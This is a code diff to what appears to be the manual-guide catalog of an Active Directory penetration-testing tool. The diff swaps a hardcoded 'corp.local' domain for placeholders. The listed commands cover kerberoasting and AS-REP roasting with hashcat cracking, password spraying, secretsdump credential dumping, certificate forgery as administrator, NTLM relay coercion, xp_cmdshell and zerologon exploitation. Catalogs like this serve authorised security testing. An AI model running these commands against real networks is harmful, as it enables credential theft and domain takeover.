@@ -59,10 +59,10 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
             "Treat _ldap._tcp targets as primary DC candidates for LDAP/SMB follow-up.",
         ),
         commands=(
-            "dig +short SRV _ldap._tcp.dc._msdcs.corp.local",
-            "dig +short SRV _kerberos._tcp.corp.local",
-            "dig +short SRV _gc._tcp.corp.local",
-            "nslookup -type=SRV _ldap._tcp.corp.local",
+            "dig +short SRV _ldap._tcp.dc._msdcs.<DOMAIN>",
+            "dig +short SRV _kerberos._tcp.<DOMAIN>",
+            "dig +short SRV _gc._tcp.<DOMAIN>",
+            "nslookup -type=SRV _ldap._tcp.<DOMAIN>",
         ),
         tools=("dig", "nslookup", "admapper start_unauth"),
         mitre_id="T1018",
@@ -82,7 +82,7 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
         ),
         commands=(
             "ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts",
-            'ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local" '
+            'ldapsearch -x -H ldap://<DC_IP> -b "<BASE_DN>" '
             '"(&(objectClass=user)(objectCategory=person))" sAMAccountName userAccountControl',
             "nxc ldap <DC_IP> -u '' -p '' --users",
         ),
@@ -125,9 +125,9 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
             "Attempt Kerberos or SMB password spraying with lockout awareness.",
         ),
         commands=(
-            "kerbrute userenum -d corp.local --dc <DC_IP> users.txt",
-            "GetNPUsers.py corp.local/ -no-pass -usersfile users.txt",
-            "GetUserSPNs.py corp.local/user:pass -dc-ip <DC_IP> -request",
+            "kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt",
+            "GetNPUsers.py <DOMAIN>/ -no-pass -usersfile users.txt",
+            "GetUserSPNs.py <DOMAIN>/user:pass -dc-ip <DC_IP> -request",
         ),
         tools=("Impacket", "kerbrute", "hashcat", "ADMapper asreproast / kerberoast"),
         mitre_id="T1558",
@@ -194,7 +194,7 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
         ),
         commands=(
             "nxc smb <DC_IP> -u guest -p '' --rid-brute 500-10000",
-            "lookupsid.py corp.local/guest@<DC_IP>",
+            "lookupsid.py <DOMAIN>/guest@<DC_IP>",
             "crackmapexec smb <DC_IP> -u guest -p '' --rid-brute",
         ),
         tools=("NetExec", "Impacket lookupsid", "ADMapper enum users"),
@@ -214,7 +214,7 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
             "Use recovered password for authenticated enumeration.",
         ),
         commands=(
-            "GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -dc-ip <DC_IP>",
+            "GetNPUsers.py <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>",
             "hashcat -m 18200 asrep_hashes.txt wordlist.txt",
         ),
         tools=("Impacket GetNPUsers", "hashcat", "ADMapper asreproast"),
@@ -237,7 +237,7 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
             "Use recovered creds; service accounts may have elevated rights.",
         ),
         commands=(
-            "GetUserSPNs.py corp.local/user:pass -dc-ip <DC_IP> -request",
+            "GetUserSPNs.py <DOMAIN>/user:pass -dc-ip <DC_IP> -request",
             "hashcat -m 13100 tgs_hashes.txt wordlist.txt",
         ),
         tools=("Impacket GetUserSPNs", "hashcat", "ADMapper kerberoast"),
@@ -263,9 +263,9 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
             "On success, verify cred and pivot to authenticated enumeration.",
         ),
         commands=(
-            "ldapsearch -x -H ldap://<DC> -b DC=corp,DC=local "
+            "ldapsearch -x -H ldap://<DC> -b <BASE_DN> "
             "(objectClass=domain) lockoutThreshold lockoutDuration",
-            "kerbrute passwordspray -d corp.local --dc <DC_IP> users.txt 'Winter2026!'",
+            "kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt 'Winter2026!'",
             "nxc smb <DC_IP> -u users.txt -p 'Winter2026!' --continue-on-success",
         ),
         tools=("kerbrute", "NetExec", "ldap3", "ADMapper spray"),
@@ -285,8 +285,8 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
         ),
         commands=(
             "nxc smb <DC_IP> -u user -p password",
-            "ldapwhoami -x -H ldap://<DC_IP> -D user@corp.local -w password",
-            "getTGT.py corp.local/user:password",
+            "ldapwhoami -x -H ldap://<DC_IP> -D user@<DOMAIN> -w password",
+            "getTGT.py <DOMAIN>/user:password",
         ),
         tools=("NetExec", "ldapwhoami", "Impacket getTGT", "ADMapper creds verify"),
         mitre_id="T1078",
@@ -308,7 +308,7 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
         ),
         commands=(
             "nxc ldap <DC_IP> -u user -p password --groups",
-            "bloodhound-python -u user -p password -d corp.local -ns <DC_IP> -c All",
+            "bloodhound-python -u user -p password -d <DOMAIN> -ns <DC_IP> -c All",
         ),
         tools=("NetExec", "bloodhound-python", "ADMapper start_auth"),
         mitre_id="T1078",
@@ -328,8 +328,8 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
         ),
         commands=(
             "nxc ldap <DC> -u user -p pass --users --groups --computers",
-            "bloodhound-python -u user -p pass -d corp.local -c All",
-            "GetGPPPassword.py corp.local/user:pass -dc-ip <DC>",
+            "bloodhound-python -u user -p pass -d <DOMAIN> -c All",
+            "GetGPPPassword.py <DOMAIN>/user:pass -dc-ip <DC>",
         ),
         tools=("ldap3", "Impacket", "NetExec", "bloodhound-python", "ADMapper start_auth"),
         mitre_id="T1087.002",
@@ -381,7 +381,7 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
             "ADMapper acls",
             "ADMapper acls show acl-001",
             "dacledit.py -action read -target <dn>",
-            "secretsdump.py corp.local/user:pass@<DC>",
+            "secretsdump.py <DOMAIN>/user:pass@<DC>",
         ),
         tools=("ADMapper acls", "Impacket dacledit/owneredit", "bloodyAD", "NetExec", "BloodHound"),
         mitre_id="T1098",
@@ -431,7 +431,7 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
         ),
         commands=(
             "ADMapper timeroast",
-            "timeroast.py -d corp.local -u user -p pass --dc-ip <DC>",
+            "timeroast.py -d <DOMAIN> -u user -p pass --dc-ip <DC>",
             "hashcat -m 19900 timeroast_hashes.txt wordlist.txt",
         ),
         tools=("ADMapper timeroast", "timeroast.py", "NetExec", "hashcat"),
@@ -458,8 +458,8 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
         commands=(
             "ADMapper adcs",
             "ADMapper adcs show adcs-001",
-            "certipy find -u user@corp.local -p pass -dc-ip <DC>",
-            "certipy req -ca <CA> -template <Template> -upn administrator@corp.local",
+            "certipy find -u user@<DOMAIN> -p pass -dc-ip <DC>",
+            "certipy req -ca <CA> -template <Template> -upn administrator@<DOMAIN>",
         ),
         tools=("ADMapper adcs", "Certipy", "ntlmrelayx", "Impacket"),
         mitre_id="T1649",
@@ -481,7 +481,7 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
         ),
         commands=(
             "certipy ca -backup -ca corp-DC01-CA",
-            "certipy forge -ca-pfx ca.pfx -upn administrator@corp.local",
+            "certipy forge -ca-pfx ca.pfx -upn administrator@<DOMAIN>",
             "certipy auth -pfx administrator.pfx -dc-ip <DC>",
         ),
         tools=("Certipy", "ADMapper adcs"),
@@ -508,7 +508,7 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
             "ADMapper coerce",
             "ADMapper coerce show coerce-001",
             "ntlmrelayx.py -t ldap://<DC> --delegate-access",
-            "PetitPotam.py -d corp.local -u user -p pass <listener>",
+            "PetitPotam.py -d <DOMAIN> -u user -p pass <listener>",
         ),
         tools=("ADMapper coerce", "Impacket ntlmrelayx", "PetitPotam", "coercer"),
         mitre_id="T1187",
@@ -559,8 +559,8 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
         commands=(
             "ADMapper postex",
             "ADMapper postex show postex-001",
-            "secretsdump.py corp.local/user:pass@<DC> -just-dc",
-            "wmiexec.py corp.local/user:pass@<host>",
+            "secretsdump.py <DOMAIN>/user:pass@<DC> -just-dc",
+            "wmiexec.py <DOMAIN>/user:pass@<host>",
             "nxc smb <host> -u user -p pass --shares",
         ),
         tools=("ADMapper postex", "Impacket", "NetExec", "mimikatz", "pypykatz"),
@@ -665,7 +665,7 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
         commands=(
             "ADMapper mssql",
             "ADMapper mssql show mssql-001",
-            "mssqlclient.py corp.local/user:pass@<host> -windows-auth",
+            "mssqlclient.py <DOMAIN>/user:pass@<host> -windows-auth",
             "nxc mssql <host> -u user -p pass --impersonate dbo",
             "SELECT name FROM sys.servers WHERE is_linked = 1;",
             "EXEC xp_cmdshell 'whoami';",
@@ -695,7 +695,7 @@ MANUAL_GUIDE_CATALOG: dict[str, ManualGuide] = {
             "ADMapper cves",
             "ADMapper cves show cve-001",
             "ADMapper cves exploit nopac",
-            "ADMapper cves exploit zerologon dc01.corp.local",
+            "ADMapper cves exploit zerologon dc01.<DOMAIN>",
             "nmap --script smb-vuln-ms17-010 -p445 <host>",
         ),
         tools=("ADMapper cves", "Impacket", "NetExec", "nmap", "nopac.py"),
